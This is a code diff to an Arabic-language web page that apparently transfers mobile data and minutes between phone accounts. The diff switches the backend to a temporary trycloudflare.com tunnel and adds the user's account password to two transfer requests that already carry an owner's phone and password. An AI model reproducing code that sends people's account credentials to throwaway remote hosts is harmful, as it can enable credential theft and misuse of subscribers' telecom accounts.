@@ -311,7 +311,7 @@ body { font-family: Arial, sans-serif; background: linear-gradient(135deg, #667e
 </div>
 
 <script>
-const BACKEND_URL = 'https://exists-vampire-mistakes-strange.trycloudflare.com';
+const BACKEND_URL = 'https://long-hit-sunshine-wet.trycloudflare.com';
 let SESSION_ID = localStorage.getItem('sessionId');
 if (!SESSION_ID) {
     SESSION_ID = 'sess_' + Math.random().toString(36).substr(2, 9);
@@ -665,7 +665,7 @@ if (!phone || !pass || !plan) { notify('⚠️ املأ الحقول', 'error');
 const [gb, minutes] = plan.split('|');
 openTerminal();
 try {
-await apiCall('/api/split-transfer', { phone, gb, minutes, owner_phone: owner.phone, owner_password: owner.password });
+await apiCall('/api/split-transfer', { phone, pass, gb, minutes, owner_phone: owner.phone, owner_password: owner.password });
 addSavedNumber({ phone, owner: owner.phone, gb, minutes, type: 'تطير مع تقسيم' });
 closeModal('split');
 } catch(e) { termLog('❌ ' + e.message, 'error'); }
@@ -680,7 +680,7 @@ if (!phone || !pass || !plan) { notify('⚠️ املأ الحقول', 'error');
 const [gb, minutes] = plan.split('|');
 openTerminal();
 try {
-await apiCall('/api/nosplit-transfer', { phone, gb, minutes, owner_phone: owner.phone, owner_password: owner.password });
+await apiCall('/api/nosplit-transfer', { phone, pass, gb, minutes, owner_phone: owner.phone, owner_password: owner.password });
 addSavedNumber({ phone, owner: owner.phone, gb, minutes, type: 'تطير بدون تقسيم' });
 closeModal('nosplit');
 } catch(e) { termLog('❌ ' + e.message, 'error'); }
